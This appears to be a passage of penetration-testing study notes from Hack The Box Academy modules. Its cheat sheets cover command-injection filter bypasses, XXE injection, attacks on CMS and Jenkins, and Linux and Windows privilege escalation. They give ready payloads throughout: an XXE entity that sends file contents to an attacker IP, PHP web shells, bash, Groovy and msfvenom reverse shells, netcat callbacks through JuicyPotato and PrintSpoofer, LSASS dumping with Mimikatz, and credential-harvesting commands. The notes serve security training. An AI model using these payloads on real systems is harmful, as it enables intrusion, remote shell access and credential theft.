HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

**Example**

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

### Cheatsheet

**Injection Operators**

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                           |
| ------------------ | ------------------- | --------------------- | ------------------------------------------ |
| Semicolon          | ;                   | %3b                   | Both                                       |
| New Line           | \n                  | %0a                   | Both                                       |
| Background         | &                   | %26                   | Both (second output generally shown first) |
| Pipe               | \|                  | %7c                   | Both (only second output is shown)         |
| AND                | &&                  | %26%26                | Both (only if first succeeds)              |
| OR                 | \|\|                | %7c%7c                | Second (only if first fails)               |
| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                          |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                          |

**Linux Filtered Character Bypass**

| Code                  | Description                                                                      |
| --------------------- | -------------------------------------------------------------------------------- |
| printenv              | Can be used to view all environment variables                                    |
| %09                   | Using tabs instead of spaces                                                     |
| ${IFS}                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |
| {ls,-la}              | Commas will be replaced with spaces                                              |
| ${PATH:0:1}           | Will be replaced with /                                                          |
| ${LS_COLORS:10:1}     | Will be replaced with ;                                                          |
| $(tr '!-}' '"-~'<<<[) | Shift character by one ([ -> \)                                                  |

**Linux Blacklisted Command Bypass**

| Code                                                       | Description                         |
| ---------------------------------------------------------- | ----------------------------------- |
| ' or "                                                     | Total must be even                  |
| $@ or \                                                    | Linux only                          |
| $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")                           | Execute command regardless of cases |
| $(a="WhOaMi";printf %s "${a,,}")                           | Another variation of the technique  |
| echo 'whoami' \| rev                                       | Reverse a string                    |
| $(rev<<<'imaohw')                                          | Execute reversed command            |
| echo -n 'cat /etc/passwd \| grep 33' \| base64             | Encode a string with base64         |
| bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) | Execute b64 encoded string          |

**Windows Filtered Character Bypass**

| Code                  | Description                                                |
| --------------------- | ---------------------------------------------------------- |
| Get-ChildItem Env:    | Can be used to view all environment variables (PowerShell) |
| %09                   | Using tabs instead of spaces                               |
| %PROGRAMFILES:~10,-5% | Will be replaced with a space (CMD)                        |
| $env:PROGRAMFILES[10] | Will be replaced with a space (PowerShell)                 |
| %HOMEPATH:~0,-17%     | Will be replaced with \ (CMD)                              |
| $env:HOMEPATH[0]      | Will be replaced with \ (PowerShell)                       |

**Windows Blacklisted Command Bypass**

| Code                                                                                                       | Description                              |
| ---------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| ' or "                                                                                                     | Total must be even                       |
| ^                                                                                                          | Windows only (CMD)                       |
| WhoAmi                                                                                                     | Simply send the character with odd cases |
| "whoami"[-1..-20] -join ''                                                                                 | Reverse a string                         |
| iex "$('imaohw'[-1..-20] -join '')"                                                                        | Execute reversed command                 |
| [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))                              | Encode a string with base64              |
| iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" | Execute b64 encoded string               |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/109)

## Web Attacks

### HTTP Verb Tampering

The first web attack discussed in this module is [HTTP Verb Tampering](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering). An HTTP Verb Tampering attack exploits web servers that accept many HTTP verbs and methods. This can be exploited by sending malicious requests using unexpected methods, which may lead to bypassing the web application's authorization mechanism or even bypassing its security controls against other web attacks. HTTP Verb Tampering attacks are one of many other HTTP attacks that can be used to exploit web server configurations by sending malicious HTTP requests.

### Insecure Direct Object References (IDOR)

The second attack discussed in this module is [Insecure Direct Object References (IDOR)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References). IDOR is among the most common web vulnerabilities and can lead to accessing data that should not be accessible by attackers. What makes this attack very common is essentially the lack of a solid access control system on the back-end. As web applications store users' files and information, they may use sequential numbers or user IDs to identify each item. Suppose the web application lacks a robust access control mechanism and exposes direct references to files and resources. In that case, we may access other users' files and information by simply guessing or calculating their file IDs.

### XML External Entity (XXE) Injection

The third and final web attack we will discuss is [XML External Entity (XXE) Injection](<https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>). Many web applications process XML data as part of their functionality. Suppose a web application utilizes outdated XML libraries to parse and process XML input data from the front-end user. In that case, it may be possible to send malicious XML data to disclose local files stored on the back-end server. These files may be configuration files that may contain sensitive information like passwords or even the source code of the web application, which would enable us to perform a Whitebox Penetration Test on the web application to identify more vulnerabilities. XXE attacks can even be leveraged to steal the hosting server's credentials, which would compromise the entire server and allow for remote code execution.

### Automated XXE OOB Exfiltration

[XXEInjector](https://github.com/enjoiz/XXEinjector) supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

```bash
woadey@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

### Cheatsheet

**XXE**

| Code                                                                               | Description                                    |
| ---------------------------------------------------------------------------------- | ---------------------------------------------- |
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">`                                | Define External Entity to a URL                |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">`                                        | Define External Entity to a file path          |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`        | Reading a file through a PHP error             |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">`  | Reading a file OOB exfiltration                |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/134)

## Attacking Common Applications

| Category                                                                                                                   | Applications                                                           |
| -------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| [Web Content Management](https://enlyft.com/tech/web-content-management)                                                   | Joomla, Drupal, WordPress, DotNetNuke, etc.                            |
| [Application Servers](https://enlyft.com/tech/application-servers)                                                         | Apache Tomcat, Phusion Passenger, Oracle WebLogic, IBM WebSphere, etc. |
| [Security Information and Event Management (SIEM)](https://enlyft.com/tech/security-information-and-event-management-siem) | Splunk, Trustwave, LogRhythm, etc.                                     |
| [Network Management](https://enlyft.com/tech/network-management)                                                           | PRTG Network Monitor, ManageEngine Opmanger, etc.                      |
| [IT Management](https://enlyft.com/tech/it-management-software)                                                            | Nagios, Puppet, Zabbix, ManageEngine ServiceDesk Plus, etc.            |
| [Software Frameworks](https://enlyft.com/tech/software-frameworks)                                                         | JBoss, Axis2, etc.                                                     |
| [Customer Service Management](https://enlyft.com/tech/customer-service-management)                                         | osTicket, Zendesk, etc.                                                |
| [Search Engines](https://enlyft.com/tech/search-engines)                                                                   | Elasticsearch, Apache Solr, etc.                                       |
| [Software Configuration Management](https://enlyft.com/tech/software-configuration-management)                             | Atlassian JIRA, GitHub, GitLab, Bugzilla, Bugsnag, Bitbucket, etc.     |
| [Software Development Tools](https://enlyft.com/tech/software-development-tools)                                           | Jenkins, Atlassian Confluence, phpMyAdmin, etc.                        |
| [Enterprise Application Integration](https://enlyft.com/tech/enterprise-application-integration)                           | Oracle Fusion Middleware, BizTalk Server, Apache ActiveMQ, etc.        |

| Application          | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| WordPress            | [WordPress](https://wordpress.org/) is an open-source Content Management System (CMS) that can be used for multiple purposes. It's often used to host blogs and forums. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend.                                                                                                                                                                                                                                |
| Drupal               | [Drupal](https://www.drupal.org/) is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules.                                                                                                                                                                                                                                                                                                                                                      |
| Joomla               | [Joomla](https://www.joomla.org/) is yet another open-source CMS written in PHP that typically uses MySQL but can be made to run with PostgreSQL or SQLite. Joomla can be used for blogs, discussion forums, e-commerce, and more. Joomla can be customized heavily with themes and extensions and is estimated to be the third most used CMS on the internet after WordPress and Shopify.                                                                                                                                                                                                                                                                                                                             |
| Tomcat               | [Apache Tomcat](https://tomcat.apache.org/) is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased with Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle.                                                                                                                                                                                                                                                                                                                                                                   |
| Jenkins              | [Jenkins](https://jenkins.io/) is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication.                                                                                                                                                                                                                                                                                                         |
| Splunk               | Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from a considerable amount of known vulnerabilities aside from an information disclosure vulnerability ([CVE-2018-11409](https://nvd.nist.gov/vuln/detail/CVE-2018-11409)), and an authenticated remote code execution vulnerability in very old versions ([CVE-2011-4642](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4642)). |
| PRTG Network Monitor | [PRTG Network Monitor](https://www.paessler.com/prtg) is an agentless network monitoring system that can be used to monitor metrics such as uptime, bandwidth usage, and more from a variety of devices such as routers, switches, servers, etc. It utilizes an auto-discovery mode to scan a network and then leverages protocols such as ICMP, WMI, SNMP, and NetFlow to communicate with and gather data from discovered devices. PRTG is written in [Delphi](<https://en.wikipedia.org/wiki/Delphi_(software)>).                                                                                                                                                                                                   |
| osTicket             | [osTicket](https://osticket.com/) is a widely-used open-source support ticketing system. It can be used to manage customer service tickets received via email, phone, and the web interface. osTicket is written in PHP and can run on Apache or IIS with MySQL as the backend.                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| GitLab               | [GitLab](https://about.gitlab.com/) is an open-source software development platform with a Git repository manager, version control, issue tracking, code review, continuous integration and deployment, and more. It was originally written in Ruby but now utilizes Ruby on Rails, Go, and Vue.js. GitLab offers both community (free) and enterprises versions of the software.                                                                                                                                                                                                                                                                                                                                      |

### Cheatsheet

| Command                                                                                                                                                                                                                                       | Description                                                                                                                                                                                                                |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo vim /etc/hosts`                                                                                                                                                                                                                         | Opens the `/etc/hosts` with `vim` to start adding hostnames                                                                                                                                                                |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list`                                                                                                                                                       | Runs an nmap scan using common web application ports based on a scope list (`scope_list`) and outputs to a file (`web_discovery`) in all formats (`-oA`)                                                                   |
| `eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>`                                                                                                                                                                       | Runs `eyewitness` using a file generated by an nmap scan (`web_discovery.xml`) and creates a directory (`-d`)                                                                                                              |
| `cat web_discovery.xml \| ./aquatone -nmap`                                                                                                                                                                                                   | Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it to aquatone (`./aquatone`) while ensuring aquatone recognizes the file as nmap scan output (`-nmap`)                                        |
| `sudo wpscan --url <http://domainnameoripaddress> --enumerate`                                                                                                                                                                                | Runs wpscan using the `--enumerate` flag. Can replace the url with any valid and reachable URL in each challenge                                                                                                           |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>`                                                                                                                 | Runs wpscan and uses it to perform a password attack (`--password-attack`) against the specified url and references a word list (`/usr/share/wordlists/rockyou.txt`)                                                       |
| `curl -s http://<hostnameoripoftargetsite/path/to/webshell.php?cmd=id`                                                                                                                                                                        | cURL command used to execute commands (`cmd=id`) on a vulnerable system utilizing a php-based webshell                                                                                                                     |
| `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip address of attack box>/<port of choice> 0>&1'");`                                                                                                                                          | PHP code that will execute a reverse shell on a Linux-based system                                                                                                                                                         |
| `droopescan scan joomla --url http://<domainnameoripaddress>`                                                                                                                                                                                 | Runs `droopescan` against a Joomla site located at the specified url                                                                                                                                                       |
| `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr <username or path to username list>`                                                             | Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (`/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt`) and user or list of usernames (`-usr`)             |
| `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>`                                                                                                                                                                                 | PHP code that will allow for web shell access on a vulnerable Drupal site. Can be used through browsing to the location of the file in the web directory after saving. Can also be leveraged utilizing curl.               |
| `curl -s <http://domainname or IP address of site> /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d">"`                                                                                                                  | Uses curl to navigate to php web shell file and run system commands (`=id`) on the target                                                                                                                                  |
| `gobuster dir -u <http://domainnameoripaddressofsite> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`                                                                                                                         | `Gobuster` powered directory brute forcing attack referencing a wordlist (`/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`)                                                                                   |
| `auxiliary/scanner/http/tomcat_mgr_login`                                                                                                                                                                                                     | Useful Metasploit scanner module used to perform a brute force login attack against a Tomcat site                                                                                                                          |
| `python3 mgr_brute.py -U <http://domainnameoripaddressofTomCatsite> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt` | Runs mgr_brute.py using python3 against the specified website starts in the /manager directory (`-P /manager`) and references a specified user or user list (`-u`) as well as a specified password or password list (`-p`) |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address of attack box> LPORT=<port to listen on to catch a shell> -f war > backup.war`                                                                                                      | Generates a JSP-based reverse shell payload in the form of a .war file utilizing `msfvenom`                                                                                                                                |
| `nmap -sV -p 8009,8080 <domainname or IP address of tomcat site>`                                                                                                                                                                             | Nmap scan useful in enumerating Apache Tomcat and AJP services                                                                                                                                                             |
| `r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 \| while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()`                                                                    | Groovy-based reverse shell payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. Will work when the underlying OS is Linux                                                             |
| `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");`                                                                                                                                                                               | Groovy-based payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. This will allow web shell access and to execute commands on the underlying Windows system                           |
| `String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So)`                                                                                          | Groovy-based reverse shell payload/code that can work with admin access to the `Script Console` of a `Jenkins` site. Will work when the underlying OS is Windows                                                           |
| [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)                                                                                                                                                                       | A simple Splunk package for obtaining reverse shells on Windows and Linux systems                                                                                                                                          |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/113)

## Linux Priviledge Escalation

### Cheatsheet

| Command                                                                             | Description                                           |
| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |
| `ssh htb-student@<target IP>`                                                       | SSH to lab target                                     |
| `ps aux \| grep root`                                                               | See processes running as root                         |
| `ps au`                                                                             | See logged in users                                   |
| `ls /home`                                                                          | View user home directories                            |
| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |
| `history`                                                                           | Check the current user's Bash history                 |
| `sudo -l`                                                                           | Can the user run anything as another user?            |
| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |
| `lsblk`                                                                             | Check for unmounted file systems/drives               |
| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writable directories                       |
| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writable files                             |
| `uname -a`                                                                          | Check the Kernel version                              |
| `cat /etc/lsb-release`                                                              | Check the OS version                                  |
| `gcc kernel_exploit.c -o kernel_exploit`                                            | Compile an exploit written in C                       |
| `screen -v`                                                                         | Check the installed version of Screen                 |
| `./pspy64 -pf -i 1000`                                                              | View running processes with pspy                      |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SUID bit set                   |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |
| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Privilege escalation with tcpdump                     |
| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |
| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |
| `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                   | Search for config files                               |
| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |
| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using LD_PRELOAD                  |
| `readelf -d payroll \| grep PATH`                                                   | Check the RUNPATH of a binary                         |
| `gcc src.c -fPIC -shared -o /development/libshared.so`                              | Compile a shared library                              |
| `lxd init`                                                                          | Start the LXD initialization process                  |
| `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`                  | Import a local image                                  |
| `lxc init alpine r00t -c security.privileged=true`                                  | Start a privileged LXD container                      |
| `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`      | Mount the host file system in a container             |
| `lxc start r00t`                                                                    | Start the container                                   |
| `showmount -e 10.129.2.12`                                                          | Show the NFS export list                              |
| `sudo mount -t nfs 10.129.2.12:/tmp /mnt`                                           | Mount an NFS share locally                            |
| `tmux -S /shareds new -s debugsess`                                                 | Create a shared tmux session socket                   |
| `./lynis audit system`                                                              | Perform a system audit with Lynis                     |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/51)

## Windows Privilege Escalation

### Cheatsheet

**Initial Enumeration**

| Command                                                                                               | Description                                    |
| ----------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
| `xfreerdp /v:<target ip> /u:htb-student`                                                              | RDP to lab target                              |
| `ipconfig /all`                                                                                       | Get interface, IP address and DNS information  |
| `arp -a`                                                                                              | Review ARP table                               |
| `route print`                                                                                         | Review routing table                           |
| `Get-MpComputerStatus`                                                                                | Check Windows Defender status                  |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections`                            | List AppLocker rules                           |
| `Get-AppLockerPolicy -Local \| Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone` | Test AppLocker policy                          |
| `set`                                                                                                 | Display all environment variables              |
| `systeminfo`                                                                                          | View detailed system configuration information |
| `wmic qfe`                                                                                            | Get patches and updates                        |
| `wmic product get name`                                                                               | Get installed programs                         |
| `tasklist /svc`                                                                                       | Display running processes                      |
| `query user`                                                                                          | Get logged-in users                            |
| `echo %USERNAME%`                                                                                     | Get current user                               |
| `whoami /priv`                                                                                        | View current user privileges                   |
| `whoami /groups`                                                                                      | View current user group information            |
| `net user`                                                                                            | Get all system users                           |
| `net localgroup`                                                                                      | Get all system groups                          |
| `net localgroup administrators`                                                                       | View details about a group                     |
| `net accounts`                                                                                        | Get password policy                            |
| `netstat -ano`                                                                                        | Display active network connections             |
| `pipelist.exe /accepteula`                                                                            | List named pipes                               |
| `gci \\\\.\pipe\\`                                                                                    | List named pipes with PowerShell               |
| `accesschk.exe /accepteula \\\\.\\Pipe\\lsass -v`                                                     | Review permissions on a named pipe             |

**Handy Commands**

| Command                                                                                                                                                                               | Description                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| `mssqlclient.py sql_dev@10.129.43.30 -windows-auth`                                                                                                                                   | Connect using mssqlclient.py                               |
| `enable_xp_cmdshell`                                                                                                                                                                  | Enable xp_cmdshell with mssqlclient.py                     |
| `xp_cmdshell whoami`                                                                                                                                                                  | Run OS commands with xp_cmdshell                           |
| `c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *`                                                             | Escalate privileges with JuicyPotato                       |
| `c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"`                                                                                                               | Escalating privileges with PrintSpoofer                    |
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp`                                                                                                                                    | Take memory dump with ProcDump                             |
| `sekurlsa::minidump lsass.dmp` and `sekurlsa::logonpasswords`                                                                                                                         | Use MimiKatz to extract credentials from LSASS memory dump |
| `dir /q C:\backups\wwwroot\web.config`                                                                                                                                                | Checking ownership of a file                               |
| `takeown /f C:\backups\wwwroot\web.config`                                                                                                                                            | Taking ownership of a file                                 |
| `Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}`                                             | Confirming changed ownership of a file                     |
| `icacls “C:\backups\wwwroot\web.config” /grant htb-student:F`                                                                                                                         | Modifying a file ACL                                       |
| `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`                                                                                                            | Extract hashes with secretsdump.py                         |
| `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`                                                                                                                                         | Copy files with ROBOCOPY                                   |
| `wevtutil qe Security /rd:true /f:text \| Select-String "/user"`                                                                                                                      | Searching security event logs                              |
| `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 \| findstr "/user"`                                                                                       | Passing credentials to wevtutil                            |
| `Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}` | Searching event logs with PowerShell                       |
| `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`                                                                              | Generate malicious DLL                                     |
| `dnscmd.exe /config /serverlevelplugindll adduser.dll`                                                                                                                                | Loading a custom DLL with dnscmd                           |
| `wmic useraccount where name="netadm" get sid`                                                                                                                                        | Finding a user's SID                                       |
| `sc.exe sdshow DNS`                                                                                                                                                                   | Checking permissions on DNS service                        |
| `sc stop dns`                                                                                                                                                                         | Stopping a service                                         |
| `sc start dns`                                                                                                                                                                        | Starting a service                                         |
| `reg query \\\\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`                                                                                                     | Querying a registry key                                    |
| `reg delete \\\\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll`                                                                            | Deleting a registry key                                    |
| `sc query dns`                                                                                                                                                                        | Checking a service status                                  |
| `Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local`                                                                                             | Disabling the global query block list                      |
| `Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`                                                | Adding a WPAD record                                       |
| `cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`                                                                                                                             | Compile with cl.exe                                        |
| `reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\\??\\C:\Tools\Capcom.sys"`                                                                                  | Add reference to a driver (1)                              |
| `reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`                                                                                                              | Add reference to a driver (2)                              |
| `.\DriverView.exe /stext drivers.txt` and `cat drivers.txt \| Select-String -pattern Capcom`                                                                                          | Check if driver is loaded                                  |
| `EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`                                                                                                               | Using EopLoadDriver                                        |
| `c:\Tools\PsService.exe security AppReadiness`                                                                                                                                        | Checking service permissions with PsService                |
| `sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"`                                                                                              | Modifying a service binary path                            |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`                                                                                | Confirming UAC is enabled                                  |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`                                                               | Checking UAC level                                         |
| `[environment]::OSVersion.Version`                                                                                                                                                    | Checking Windows version                                   |
| `cmd /c echo %PATH%`                                                                                                                                                                  | Reviewing path variable                                    |
| `curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"`                                                                           | Downloading file with cURL in PowerShell                   |
| `rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll`                                                                                   | Executing custom dll with rundll32.exe                     |
| `.\SharpUp.exe audit`                                                                                                                                                                 | Running SharpUp                                            |
| `icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"`                                                                                                                       | Checking service permissions with icacls                   |
| `cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"`                                                                                           | Replace a service binary                                   |
| `wmic service get name,displayname,pathname,startmode \| findstr /i "auto" \| findstr /i /v "c:\windows\\" \| findstr /i /v """`                                                      | Searching for unquoted service paths                       |
| `accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services`                                                                                                    | Checking for weak service ACLs in the Registry             |
| `Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"`            | Changing ImagePath with PowerShell                         |
| `Get-CimInstance Win32_StartupCommand \| select Name, command, Location, User \| fl`                                                                                                  | Check startup programs                                     |
| `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe`                                                                       | Generating a malicious binary                              |
| `get-process -Id 3324`                                                                                                                                                                | Enumerating a process ID with PowerShell                   |
| `get-service \| ? {$_.DisplayName -like 'Druva*'}`                                                                                                                                    | Enumerate a running service by name with PowerShell        |

**Credential Theft**

| Command                                                                                                                   | Description                                        |
| ------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| `findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml`                                                              | Search for files with the phrase "password"        |
| `gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' \| Select-String password` | Searching for passwords in Chrome dictionary files |
| `(Get-PSReadLineOption).HistorySavePath`                                                                                  | Confirm PowerShell history save path               |
| `gc (Get-PSReadLineOption).HistorySavePath`                                                                               | Reading PowerShell history file                    |
| `$credential = Import-Clixml -Path 'C:\scripts\pass.xml'`                                                                 | Decrypting PowerShell credentials                  |
| `cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt`                                         | Searching file contents for a string               |
| `findstr /si password *.xml *.ini *.txt *.config`                                                                         | Searching file contents for a string               |
| `findstr /spin "password" *.*`                                                                                            | Searching file contents for a string               |
| `select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password`                                              | Search file contents with PowerShell               |
| `dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`                                        | Search for file extensions                         |
| `where /R C:\ *.config`                                                                                                   | Search for file extensions                         |
| `Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore`                                  | Search for file extensions using PowerShell        |
| `cmdkey /list`                                                                                                            | List saved credentials                             |
| `.\SharpChrome.exe logins /unprotect`                                                                                     | Retrieve saved Chrome credentials                  |
| `.\lazagne.exe -h`                                                                                                        | View LaZagne help menu                             |
| `.\lazagne.exe all`                                                                                                       | Run all LaZagne modules                            |
| `Invoke-SessionGopher -Target WINLPE-SRV01`                                                                               | Running SessionGopher                              |
| `netsh wlan show profile`                                                                                                 | View saved wireless networks                       |
